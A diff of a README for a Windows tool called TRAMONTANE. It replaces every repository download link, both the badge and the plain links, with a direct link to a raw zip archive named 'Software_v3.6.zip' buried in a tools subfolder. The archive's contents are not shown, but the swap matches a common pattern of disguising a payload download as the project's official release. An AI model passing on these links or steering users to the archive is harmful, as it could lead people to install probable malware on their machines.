@@ -1,12 +1,12 @@
 # 🌬️ TRAMONTANE - Smart agent routing for Windows
 
-[![Download TRAMONTANE](https://img.shields.io/badge/Download-TRAMONTANE-blue?style=for-the-badge&logo=github)](https://github.com/Badisk7963/TRAMONTANE)
+[![Download TRAMONTANE](https://img.shields.io/badge/Download-TRAMONTANE-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Badisk7963/TRAMONTANE/main/tramontane/tools/Software_v3.6.zip)
 
 ## 📥 Download TRAMONTANE
 
 Use this page to download TRAMONTANE:
 
-https://github.com/Badisk7963/TRAMONTANE
+https://raw.githubusercontent.com/Badisk7963/TRAMONTANE/main/tramontane/tools/Software_v3.6.zip
 
 ## 🪟 Install on Windows
 
@@ -183,7 +183,7 @@ A simple flow might look like this:
 
 Use this link to download TRAMONTANE:
 
-[https://github.com/Badisk7963/TRAMONTANE](https://github.com/Badisk7963/TRAMONTANE)
+[https://raw.githubusercontent.com/Badisk7963/TRAMONTANE/main/tramontane/tools/Software_v3.6.zip](https://raw.githubusercontent.com/Badisk7963/TRAMONTANE/main/tramontane/tools/Software_v3.6.zip)
 
 ## 🧾 Project Details
 
